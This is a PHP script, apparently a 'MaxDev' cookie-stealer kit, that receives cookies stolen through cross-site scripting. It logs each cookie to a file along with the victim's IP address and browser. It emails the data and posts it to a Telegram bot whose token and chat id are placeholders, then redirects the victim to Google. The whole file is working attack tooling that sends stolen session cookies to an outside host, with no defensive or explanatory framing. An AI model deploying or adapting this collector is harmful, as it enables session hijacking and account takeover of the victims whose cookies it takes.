<?php
include 'email.php';

?>

<?php

$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
$cookie = $_GET['c'];
$fp = fopen('log.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);


global $message;


$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->MaxDev Cookies<------------------\n\n";
$message .= "XSS-Cookie: ".$cookies."\n\n";

$message .= "Time: $timestamp \n";
$message .= "Browser: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "|----------- CrEaTeD bY MaxDev --------------|\n";

$subject = "Computer $ip";
$headers = "";

$headers .= "\n";
	 mail("", "MaxDev ", $message);
if (mail($Receive_email,$subject,$message,$headers))
	   {
            
$website="https://api.telegram.org/bot<Input_your_Telegram_Bot_Token>";
$chatId=<Input_your_Telegram_Id>;
$params=[
    'chat_id'=>'<Input_your_Telegram_Id',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

		  header('Location:https://www.google.com');

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>